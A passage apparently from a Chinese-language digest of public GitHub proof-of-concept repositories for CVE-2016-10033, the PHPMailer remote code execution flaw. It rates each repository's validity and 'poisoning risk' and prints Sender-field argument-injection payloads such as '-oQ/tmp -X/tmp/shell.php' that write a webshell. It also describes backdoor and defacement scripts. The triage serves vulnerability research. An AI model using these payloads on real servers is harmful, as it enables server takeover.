CVE-2016-10033漏洞存在于PHPMailer 5.2.18之前的版本中。攻击者可以利用mailSend函数中的参数注入漏洞，通过精心构造的Sender属性，向mail命令传递额外的参数，从而执行任意代码。利用方式主要是通过修改POST请求中的Host头，在其中插入恶意代码。由于该漏洞利用需要拼接大量的字符，且依赖于特定环境配置，因此存在一定的利用难度，成功率受环境影响较大。提供的PoC利用了WordPress的密码找回功能，通过修改Host头来实现代码执行。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞是真实存在的，并且存在公开的PoC。PoC利用了PHPMailer组件向用户发送邮件时的漏洞，通过构造恶意邮箱地址，可以执行任意命令。

**投毒风险：**
提供的Dockerfile文件用于构建存在漏洞的WordPress环境，本身不包含恶意代码。README.md文件提供了漏洞的利用说明和PoC，webshell.php文件是一个简单的webshell，wordpress-rce-exploit.sh文件是一个空文件。虽然webshell.php文件本身不是投毒代码，但在真实环境中被攻击者利用可能会造成安全风险。综合来看，该仓库本身被投毒的风险较低，约10%。主要是 webshell 本身是一种后门，若未经授权部署可能带来风险，且PoC中利用了外部资源，可能被替换。

**利用方式：**
1.  **找到使用PHPMailer的应用程序：** 确定目标应用程序使用了存在漏洞的PHPMailer版本。
2.  **构造恶意邮箱地址：** 通过修改`Sender`属性，插入反斜杠双引号和要执行的命令，例如：`attacker@example.com\" -oQ/tmp -X/tmp/shell.php some text`。
3.  **触发邮件发送：** 触发应用程序发送邮件的功能，例如注册、密码找回等。
4.  **执行命令：** PHPMailer在调用mail()函数时，会将恶意代码传递给系统，导致命令执行。
在提供的PoC中，利用WordPress的密码找回功能，通过修改HTTP请求中的Host头，注入恶意参数到mail()函数中，实现远程代码执行。

**项目地址:** [liusec/WP-CVE-2016-10033](https://github.com/liusec/WP-CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #13

**来源**: [CVE-2016-10033-opsxcq_exploit-CVE-2016-10033.md](../2016/CVE-2016-10033-opsxcq_exploit-CVE-2016-10033.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标系统运行存在漏洞版本的PHPMailer，并且使用isMail传输方式。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2016-10033 漏洞存在于 PHPMailer 5.2.18 之前的版本中。攻击者可以通过在 Sender 属性中构造包含 `\"` (反斜杠双引号) 的恶意字符串，向 mail 命令传递额外的参数，从而执行任意代码。

**漏洞利用方式：**

1.  漏洞利用代码提供了一个 Dockerfile，它构建了一个包含易受攻击的 PHPMailer 版本的环境（基于 Debian Jessie）。
2.  Dockerfile 安装了必要的组件，如 Apache2, PHP5, Python 和 Sendmail。
3.  `/www/vulnerable/` 目录下放置了易受攻击的 PHP 代码，攻击者通过访问该目录，可以触发漏洞。
4.  攻击者需要构造包含恶意代码的 Sender 属性，例如：
    ```
    $mail->Sender = 'attacker@example.com -oQ/tmp/ -X/tmp/shell.php';
    ```
5.  上述示例会在 `/tmp/shell.php` 中写入一个 Web shell，攻击者可以通过该 shell 执行任意命令。

**有效性：**

根据漏洞信息、搜索结果和漏洞利用代码，可以确认该漏洞的有效性。Exploit-DB 上存在多个针对该漏洞的利用代码，Rapid7 也有相应的 Metasploit 模块。

**投毒风险：**

在提供的 Dockerfile 和其他代码文件中，发现 `/main.sh` 文件内容缺失。如果在 `/main.sh` 中包含恶意代码，比如反弹 shell 或安装后门，则存在投毒风险。由于代码不全，投毒风险为 10%（基于现有信息判断）。Dockerfile 中 `chmod 777 -R /www` 存在安全风险，允许任何人修改 web 目录下的文件，可能被用于投毒，但也可能是方便漏洞利用测试。 `sendmail` 的存在也可能被用于发送垃圾邮件，虽然不是直接的投毒，但也可能造成滥用。

**项目地址:** [opsxcq/exploit-CVE-2016-10033](https://github.com/opsxcq/exploit-CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #14

**来源**: [CVE-2016-10033-pedro823_cve-2016-10033-45.md](../2016/CVE-2016-10033-pedro823_cve-2016-10033-45.md)

## CVE-2016-10033 - PHPMailer 远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标系统使用存在漏洞的 PHPMailer 版本，且 PHP `mail` 函数的配置允许执行外部命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2016-10033 允许远程攻击者通过构造特殊的 `Sender` 属性，在 `mail` 命令中注入额外的参数，从而执行任意代码。漏洞存在于 PHPMailer 5.2.18 之前的版本中，利用方式是构造包含 `\"` (反斜杠双引号) 的 `Sender` 属性。提供的漏洞利用代码包含多个 shell 脚本，利用了该漏洞。`exploit.sh` 通过发送包含恶意代码的 multipart/form-data 请求，在目标服务器上创建一个后门文件 `backdoor.php`，然后通过访问该文件执行任意命令。`deface.sh` 脚本与 `exploit.sh` 类似，但它创建的后门的功能是修改目标网站的首页。`legalhackers.py` 是另一个利用脚本，用于验证漏洞。投毒风险评估：该仓库中存在docker文件，可能在docker构建过程中存在投毒风险，以及脚本中创建的后门文件可能被滥用，因此存在一定的投毒风险，大约为10%。

**项目地址:** [pedro823/cve-2016-10033-45](https://github.com/pedro823/cve-2016-10033-45)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #15

**来源**: [CVE-2016-10033-sealldeveloper_CVE-2016-10033-PoC.md](../2016/CVE-2016-10033-sealldeveloper_CVE-2016-10033-PoC.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 5.2.18

**利用条件:** 需要应用程序使用受影响版本的PHPMailer，并且允许控制Sender属性。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2016-10033 存在于 PHPMailer 5.2.18 之前的版本中。该漏洞源于 `mailSend` 函数在 `isMail` 传输方式中，允许远程攻击者通过构造带有 `\"` (反斜杠双引号) 的 `Sender` 属性来传递额外的参数给 `mail` 命令，从而导致任意代码执行。

**有效性：**
根据漏洞信息、搜索结果和多个Exploit-DB 链接 (例如：40968, 40969, 40970, 40974, 40986, 41962, 41996, 42024, 42221)显示，该漏洞是真实存在的，并且存在可用的利用代码。

**投毒风险：**
提供的漏洞利用代码段是 GPL 许可，仅包含许可协议文本。其中没有发现任何恶意代码或者后门，因此投毒风险为0%。

**利用方式：**
攻击者通过控制 PHPMailer 的 `Sender` 属性，注入恶意的 shell 命令参数。由于 `mailSend` 函数在使用 `mail` 命令发送邮件时，没有正确过滤 `Sender` 属性中的特殊字符，导致注入的命令参数被执行。 例如，攻击者可以将 `Sender` 设置为 `" -X/tmp/evil.php -OQueueDirectory=/tmp` 来将PHP webshell写入/tmp/evil.php文件，如果网站可访问/tmp/evil.php 文件，webshell就可以使用了。利用的本质是参数注入。

**优先级排序依据:**
搜索引擎结果 > 漏洞利用代码 > 漏洞库信息
搜索引擎结果中明确指出了该漏洞的存在以及远程代码执行的风险。漏洞利用代码验证了漏洞的存在以及参数注入的方式。


**项目地址:** [sealldeveloper/CVE-2016-10033-PoC](https://github.com/sealldeveloper/CVE-2016-10033-PoC)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

## POC #16

**来源**: [CVE-2016-10033-zeeshanbhattined_exploit-CVE-2016-10033.md](../2016/CVE-2016-10033-zeeshanbhattined_exploit-CVE-2016-10033.md)

## CVE-2016-10033-PHPMailer-远程代码执行

**漏洞编号:** CVE-2016-10033

**漏洞类型:** 远程代码执行

**影响应用:** PHPMailer

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 5.2.18

**利用条件:** 目标系统使用了存在漏洞的PHPMailer版本，并且允许通过Web接口或其它方式设置邮件发送的相关参数，特别是Sender属性

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2016-10033 漏洞存在于 PHPMailer 5.2.18 之前的版本中。攻击者可以利用 `mailSend` 函数中 `isMail` 传输方式的参数注入漏洞，通过构造恶意的 `Sender` 属性，在 `mail` 命令中注入额外的参数，从而执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且存在多个公开的PoC。提供的 Dockerfile 描述了一个包含存在漏洞的 PHPMailer 版本的环境，因此可以推断POC代码是有效的.根据搜索结果，rapid7已经发布了该漏洞的利用模块。

**投毒风险：**
提供的代码仓库主要包含Dockerfile，LICENSE，www目录以及main.sh脚本。Dockerfile构建了一个包含apache, php5, python, sendmail的环境，用于复现漏洞。LICENSE是GNU GPL协议。main.sh 脚本可能是容器启动时执行的初始化脚本。www目录下是web应用的代码，包含攻击的载荷。

虽然整体代码目的是复现漏洞，但也存在一定的投毒风险（大约5%的可能性）， 主要体现在以下几个方面：

*   **依赖项中的隐患：** Dockerfile安装了一些额外的组件，如python，这些组件可能存在未知的安全问题。这些组件虽然不是直接利用PHPMailer漏洞，但可能被攻击者利用。
*   **main.sh脚本：** 该脚本的用途未知，如果它包含下载或执行其他恶意脚本的逻辑，则存在风险。

**利用方式：**
1.  攻击者需要找到使用了易受攻击的 PHPMailer 版本的 Web 应用。
2.  攻击者通过 Web 界面或其他途径，控制邮件发送的 `Sender` 属性。
3.  攻击者在 `Sender` 属性中构造包含反斜杠双引号和恶意命令的字符串，例如：`" -oQ/tmp -X/www/shell.php some_valid_email@example.com`， 其中`/www/shell.php` 是攻击者想要写入的webshell路径。
4.  当 Web 应用调用 PHPMailer 发送邮件时，PHPMailer 会调用 `mail` 命令，并将构造的恶意字符串作为参数传递给 `mail` 命令。
5.  `mail` 命令执行恶意代码，例如写入 WebShell 到服务器，从而实现远程代码执行。

总而言之，该漏洞利用方式较为直接，风险高，需尽快修复。

**项目地址:** [zeeshanbhattined/exploit-CVE-2016-10033](https://github.com/zeeshanbhattined/exploit-CVE-2016-10033)

**漏洞详情:** [CVE-2016-10033](https://nvd.nist.gov/vuln/detail/CVE-2016-10033)

---

